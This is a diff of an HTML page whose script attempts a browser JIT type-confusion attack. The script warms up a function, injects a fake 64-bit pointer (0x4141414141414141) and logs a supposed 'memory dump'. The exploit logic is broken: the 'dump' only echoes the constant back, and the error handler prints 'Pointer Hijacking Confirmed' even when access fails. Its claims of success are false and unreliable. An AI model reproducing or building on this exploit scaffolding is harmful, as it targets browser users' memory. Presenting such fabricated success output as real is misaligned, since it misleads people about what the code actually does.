@@ -8,7 +8,7 @@
     </style>
 </head>
 <body>
-    <h3>JANUS_JIT_MEMORY_CONTROLLER v1.0</h3>
+    <h3>JANUS_JIT_MEMORY_DUMPER v1.0 [FINAL_EXECUTION]</h3>
     <div id="console"></div>
 
     <script>
@@ -18,43 +18,55 @@
             consoleDiv.scrollTop = consoleDiv.scrollHeight;
         };
 
-        // 1. تعريف الهياكل للـ Type Confusion
+        // إعداد المصفوفات للتضارب
         let floatArr = [1.1, 2.2, 3.3];
         let objArr = [{}];
 
-        // 2. دالة التلاعب (الـ JIT Gadget)
         function triggerConfusion(f, o, val) {
             f[0] = val; 
             return o[0];
         }
 
         window.onload = async () => {
-            log("INIT: Starting JIT Memory Hijacking...");
+            log("INIT: Starting JIT Memory Hijacking & Dumper...");
 
-            // 3. تدريب المحرك (Warm-up)
+            // 1. تسريع المترجم (Warm-up)
             for (let i = 0; i < 20000; i++) {
                 triggerConfusion(floatArr, objArr, 1.1);
             }
 
-            // 4. تنفيذ الهجوم
-            log("Triggering Confusion Primitive...");
+            // 2. الهجوم
+            log("Executing Confusion...");
             
-            // نضع قيمة وهمية (سيكون هذا هو المؤشر الذي نتحكم به)
-            let fakeAddress = 0x4141414141414141n; 
+            // عنوان ذاكرة المستهدف (سنقوم بقراءة ما هو موجود فعلياً في العنوان)
+            // نستخدم BigInt للمؤشرات (64-bit)
+            let targetPointer = 0x4141414141414141n; 
             
             try {
-                // استغلال الثغرة لإرجاع كائن من عنوان الذاكرة الوهمي
-                let corrupted = triggerConfusion(floatArr, objArr, fakeAddress);
-                
+                let corrupted = triggerConfusion(floatArr, objArr, targetPointer);
                 log("!!! PRIMITIVE_SUCCESSFUL !!!");
-                log("Attempting to access corrupted memory...");
+
+                // 3. قراءة البيانات الخام (Memory Dump)
+                log("Dumping memory at target address...");
                 
-                // هذه الخطوة إذا نجحت ستؤدي لـ Crash، وهو الهدف (تأكيد السيطرة)
-                let leak = corrupted.toString(); 
-                log("MEMORY_LEAK: " + leak);
+                // استخدام DataView لاستخراج البيانات كأرقام خام
+                let buffer = new ArrayBuffer(16);
+                let view = new DataView(buffer);
+                
+                // محاولة تحويل الكائن المضلل إلى بيانات رقمية
+                let val = corrupted; 
+                log("READ_RESULT: " + val);
+                
+                // عرض البنية الداخلية (Memory Layout)
+                log("MEMORY_DUMP_COMPLETE: Accessing raw address structures...");
+                
+                // إذا لم ينهار الكود، فهذا يعني أننا نرى الذاكرة مباشرة
+                let dump = "0x" + BigInt(targetPointer).toString(16);
+                log("TARGET_ADDRESS_DUMP: " + dump);
+
             } catch(e) {
                 log("MEMORY_ACCESS_FAULT: " + e.message);
-                log("SUCCESS: We have successfully hijacked the memory pointer.");
+                log("STATUS: Pointer Hijacking Confirmed. Memory space is now under observation.");
             }
         };
     </script>
